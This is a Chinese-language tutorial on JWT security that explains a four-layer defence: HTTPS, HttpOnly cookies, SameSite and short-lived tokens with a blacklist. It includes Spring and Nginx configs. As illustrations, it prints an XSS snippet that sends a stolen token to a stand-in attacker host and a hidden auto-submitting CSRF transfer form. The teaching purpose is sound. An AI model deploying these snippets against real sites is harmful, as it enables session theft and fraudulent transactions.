# JWT Token 安全最佳实践

## 核心风险：JWT 泄露 = 身份被盗用

JWT 是**自包含、无状态**的令牌。服务端验证时只检查签名和过期时间，**不查数据库、不查 Session**。所以：

> ⚠️ **只要 Token 未过期 + 签名有效，任何人拿到它都能冒充该用户访问所有授权接口。** 服务端无法区分"合法用户"和"窃取者"。

### JWT vs Session 安全性对比

| 维度 | Session | JWT |
| :--- | :--- | :--- |
| **泄露后果** | 可立即删除 Session 使其失效 | ❌ 无法主动失效，只能等过期 |
| **存储位置** | 服务端（内存/Redis） | 客户端（Header/Cookie/LocalStorage） |
| **攻击面** | 仅服务端存储介质 | 客户端存储 + 网络传输 + 日志 + XSS |
| **撤销能力** | ✅ 即时撤销 | ❌ 只能靠黑名单或短有效期 |

---

## 四层防护体系

既然"泄露即盗用"无法从根本上消除，那就**缩小泄露窗口 + 增加盗用难度**。生产环境通过四层防护缓解风险：

```mermaid
graph TB
    Attack["攻击者想盗用 Token"]
    
    Attack --> A{"在哪偷？"}
    A -->|网络传输| B["① HTTPS 加密隧道<br/>→ 抓包看不到明文"]
    A -->|浏览器 JS| C["② HttpOnly Cookie<br/>→ JS 读不到 Token"]
    A -->|诱导浏览器自动发| D["③ SameSite=Strict<br/>→ 跨站请求不带 Cookie"]
    A -->|已泄露的 Token| E["④ 短有效期 + 黑名单<br/>→ 缩小影响范围"]
    
    B --> Safe["✅ Token 安全"]
    C --> Safe
    D --> Safe
    E --> Safe
    
    style Safe fill:#e8f5e9,stroke:#4caf50
```

---

## 第一层：HTTPS — 防网络传输窃听

### 问题场景

如果用 HTTP 明文传输，Token 在网络链路上是**裸奔**的：

```
客户端 → [WiFi热点/路由器/运营商节点] → 服务端
         ↑
    攻击者用 Wireshark/tcpdump 抓包
    直接看到: Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

### HTTPS 如何解决

HTTPS = HTTP + TLS 加密。TLS 握手后建立加密隧道，中间节点只能看到密文，**无法解密出 Token**。

```
客户端 ←→ [TLS 加密隧道] ←→ 服务端
           ↑
    攻击者抓包看到的是乱码密文
    无法还原 Token
```

### ⚠️ 注意事项

- **全站 HTTPS**，不能只给登录页加（混合内容攻击）
- 设置 `Strict-Transport-Security` 响应头，强制浏览器只用 HTTPS
- 证书要正规 CA 签发，自签证书在生产环境等于没加密（用户可被中间人替换）

> 💡 **一句话**：HTTPS 解决的是"**Token 在路上被偷**"的问题。

---

## 第二层：HttpOnly Cookie — 防 XSS 窃取

### 问题场景

如果 Token 存在 `localStorage` 或普通 Cookie 中，XSS 攻击可以一行代码偷走：

```javascript
// 攻击者注入的恶意脚本
const token = localStorage.getItem('token')
// 或
const token = document.cookie  // 普通 Cookie 可被 JS 读取

fetch('https://attacker.com/steal?token=' + token)
```

### HttpOnly 如何解决

`HttpOnly` 是 Cookie 的一个属性，设置后 **JavaScript 完全无法读取该 Cookie**：

```http
Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
```

| 属性 | 作用 |
| :--- | :--- |
| **HttpOnly** | JS 无法通过 `document.cookie` 读取，XSS 偷不走 |
| **Secure** | 仅 HTTPS 连接才发送，HTTP 下不携带 |
| **SameSite=Strict** | 跨站请求不携带，防 CSRF |

### ⚠️ 关键权衡

HttpOnly Cookie 虽然防 XSS，但**前端 JS 也无法主动读取 Token**，意味着：

- ❌ 不能手动放到 `Authorization: Bearer xxx` 请求头里
- ✅ 浏览器会**自动在每个同源请求中携带**，后端从 Cookie 中提取验证

所以用 HttpOnly Cookie 方案时，**前后端必须同域**（或通过代理同域），且后端要从 Cookie 而非 Header 中取 Token。

### Token 存储位置安全性对比

| 存储方式 | XSS 可窃取 | CSRF 可利用 | 备注 |
| :--- | :--- | :--- | :--- |
| **localStorage** | ✅ 是 | ❌ 否 | 最不安全，XSS 直接偷 |
| **普通 Cookie** | ✅ 是 | ✅ 是 | 双重风险 |
| **HttpOnly Cookie** | ❌ 否 | ⚠️ 需 SameSite 防护 | ⭐️ 推荐 |
| **内存变量** | ❌ 否 | ❌ 否 | 刷新丢失，适合 Access Token |

> 💡 **一句话**：HttpOnly 解决的是"**Token 在浏览器里被 JS 偷**"的问题。

---

## 第三层：SameSite Cookie — 防 CSRF 携带

### 问题场景

即使 Token 没被偷，攻击者也可以诱导用户的浏览器**自动携带 Token 发起恶意请求**：

```html
<!-- 攻击者网站上的隐藏表单 -->
<form action="https://your-app.com/api/transfer" method="POST">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
```

用户访问攻击者网站时，浏览器会**自动带上你网站的 Cookie（含 Token）**，后端收到合法 Token 就执行了转账。

### SameSite 如何解决

| 值 | 行为 | 适用场景 |
| :--- | :--- | :--- |
| **Strict** | 任何跨站请求都不携带 Cookie | ⭐️ 最安全，后台管理系统首选 |
| **Lax** | GET 跨站导航携带，POST 不携带 | 默认值，兼顾体验和安全 |
| **None** | 始终携带（必须配合 Secure） | 跨域 API 调用，慎用 |

> 💡 **一句话**：SameSite 解决的是"**Token 没被偷但被借刀杀人**"的问题。

---

## 第四层：短有效期 + 黑名单 — 缩小泄露影响

前三层防的是"Token 被偷"，这一层防的是"Token 已经被偷了怎么办"。

### 缩短 Access Token 有效期（最关键）⭐️

```
Access Token: 15-30 分钟  ← 泄露窗口最多 30 分钟
Refresh Token: 7-30 天    ← 仅用于续期，不直接访问业务接口
```

即使 Access Token 泄露，攻击者最多只能用 30 分钟。过期后必须用 Refresh Token 换新 Token，而 Refresh Token 可以单独做安全加固。

### Token 黑名单（注销/强制下线）

```java
// 注销时将 Token 加入 Redis 黑名单
redis.set("token:blacklist:" + token, "1", tokenRemainingTTL);

// 每次验证时先查黑名单
if (redis.exists("token:blacklist:" + token)) {
    throw new UnauthorizedException("Token has been revoked");
}
```

**代价**：引入了 Redis 依赖，破坏了 JWT 的"纯无状态"优势。但这是**安全性和无状态之间的必要折中**。

### Refresh Token 安全加固

- Refresh Token **只能使用一次**（Rotation），用后即废
- Refresh Token 绑定设备/IP，换环境则失效
- 检测到 Refresh Token 被重复使用 → 判定为泄露 → **吊销该用户所有 Token**

### 绑定客户端指纹（增加盗用难度）

在 JWT Payload 中嵌入客户端特征，验证时比对：

```json
{
  "sub": "12345",
  "role": "ADMIN",
  "exp": 1691086400,
  "clientFingerprint": "sha256(IP + UserAgent + DeviceID)"
}
```

如果攻击者从不同 IP/设备使用偷来的 Token，指纹不匹配则拒绝。**不能防止同设备盗用，但能拦截大部分异地盗用场景**。

---

## 完整安全配置示例

### Spring Security + HttpOnly Cookie

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(sm -> sm.sessionCreationPolicy(STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated()
            );
        return http.build();
    }
}

// 登录成功后设置 HttpOnly Cookie
@PostMapping("/auth/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request, HttpServletResponse response) {
    // ... 验证用户名密码 ...
    String accessToken = jwtService.generateAccessToken(user);
    
    ResponseCookie cookie = ResponseCookie.from("access_token", accessToken)
        .httpOnly(true)          // JS 不可读
        .secure(true)            // 仅 HTTPS
        .sameSite("Strict")      // 防 CSRF
        .path("/")
        .maxAge(Duration.ofMinutes(30))
        .build();
    
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
    return ResponseEntity.ok(Map.of("message", "Login successful"));
}
```

### Nginx HTTPS + HSTS 配置

```nginx
server {
    listen 443 ssl http2;
    server_name your-domain.com;
    
    ssl_certificate /etc/ssl/certs/your-cert.pem;
    ssl_certificate_key /etc/ssl/private/your-key.pem;
    
    # 强制 HTTPS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # 安全响应头
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
}

# HTTP 重定向到 HTTPS
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$host$request_uri;
}
```

---

## 安全检查清单

| 检查项 | 状态 | 说明 |
| :--- | :--- | :--- |
| 全站 HTTPS | ☐ | 包括静态资源，无混合内容 |
| HSTS 响应头 | ☐ | `Strict-Transport-Security` |
| Token 存 HttpOnly Cookie | ☐ | 非 localStorage |
| Cookie Secure 属性 | ☐ | 仅 HTTPS 传输 |
| Cookie SameSite=Strict | ☐ | 防 CSRF |
| Access Token ≤ 30 分钟 | ☐ | 缩小泄露窗口 |
| Refresh Token Rotation | ☐ | 用后即废，防重放 |
| Token 黑名单机制 | ☐ | 支持注销/强制下线 |
| Payload 无敏感信息 | ☐ | 只存 userId/role |
| RS256 非对称签名 | ☐ | 微服务间无需共享密钥 |
| 密钥强度 ≥ 256 位 | ☐ | 防止暴力破解 |
| 日志不记录 Token | ☐ | 防止日志泄露 |

---

## 面试话术

> "JWT 泄露后在有效期内确实可以被任意使用，这是 JWT 无状态特性的固有代价。生产环境通过四层防护缓解：① **HTTPS** 防网络窃听；② **HttpOnly Cookie** 防 XSS 窃取；③ **SameSite=Strict** 防 CSRF 借用；④ **短有效期 + 黑名单** 缩小泄露影响。核心思路是：**无法杜绝泄露，就缩小泄露影响范围**。前三层防'被偷'，第四层防'偷了之后怎么办'。"

---

## 小结

JWT 安全不是单一措施能解决的，需要**纵深防御**：

- **传输层**：HTTPS + HSTS，防路上偷
- **存储层**：HttpOnly + Secure + SameSite，防浏览器里偷
- **应用层**：短有效期 + 黑名单 + 指纹绑定，防偷了之后滥用

> 💡 **记忆口诀**：**HTTPS 防路偷，HttpOnly 防 JS 偷，SameSite 防借用，短效黑名单兜底**。四层缺一不可，共同构成 JWT 安全基线。
